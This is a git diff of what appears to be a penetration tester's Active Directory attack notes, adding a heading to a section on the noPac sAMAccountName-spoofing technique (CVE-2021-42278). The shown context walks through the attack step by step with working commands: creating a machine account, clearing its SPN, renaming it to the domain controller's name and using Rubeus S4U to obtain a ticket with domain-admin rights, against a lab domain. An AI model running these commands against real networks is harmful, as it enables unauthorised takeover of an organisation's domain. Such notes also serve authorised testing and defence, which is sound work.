@@ -1151,6 +1151,7 @@ $Descriptor.DiscretionaryAcl
 
 * * * 
 
+# noPac
 #### Using new machine to create DC$ name search order attack to get DA
 You can also create a new machine account, request a TGT, then remove the SPN and rename the same as a Domain Controller without the ```$``` - if vulnerable the Domain controller will research all machine names appending the ```$``` and will grant a TGS with permissions of the DC to your rogue DC-named machine account!
 
@@ -1160,10 +1161,8 @@ https://4sysops.com/archives/exploiting-the-cve-2021-42278-samaccountname-spoofi
 Create a machine account:
 ```New-MachineAccount -MachineAccount PC01 -Domain ecorp.lab -DomainController dc.ecorp.lab -Verbose```
 
-
 Clear SPN of the machine account:
 ```Set-DomainObject "CN=PC01,CN=Computers,DC=ecorp,DC=lab" -Clear 'serviceprincipalname' -Verbose```
-
 
 _Because you have the "creator owner" access in Active Directory for that object, you can change the sAMAccountName attribute's property. Run the command below to modify that attribute to be the same as that of the domain controller name (without the $)._
 
@@ -1183,6 +1182,8 @@ ask for a TGS using S4U and the previously stored ticket:
 ```.\Rubeus.exe s4u /ticket:... /msdsspn::ldap\dc.ecorp.lab /ptt```
 
 because it cant find the user 'DC' as described in the ticket, it will look again, find DC$ (itself) and issue a valid TGS with the DC$ perms i.e., DA for all as we asked for LDAP krbtgt service.
+
+* * * 
 
 # DNS Admins
 https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
